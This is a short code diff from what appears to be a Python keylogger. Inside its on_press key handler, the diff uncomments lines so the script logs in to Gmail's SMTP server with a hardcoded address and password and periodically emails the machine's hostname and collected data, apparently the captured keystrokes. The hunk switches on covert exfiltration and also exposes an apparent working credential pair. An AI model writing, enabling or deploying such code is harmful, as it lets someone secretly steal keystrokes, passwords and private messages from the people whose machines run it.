@@ -46,11 +46,11 @@ def on_press(key):
     if abs(mins-datetime.datetime.now().minute)>=sendfreq and sent==False:
         mins=datetime.datetime.now().minute
         print('sending email')
-        #server = smtplib.SMTP('smtp.gmail.com', 587)
-        #server.starttls()
-        #server.login("band.mishaps@gmail.com", "Baobab7512")
-        #server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
-        #server.quit()
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login("band.mishaps@gmail.com", "Baobab7512")
+        server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
+        server.quit()
         print('email sent')
         print(maildata)
         sent=True
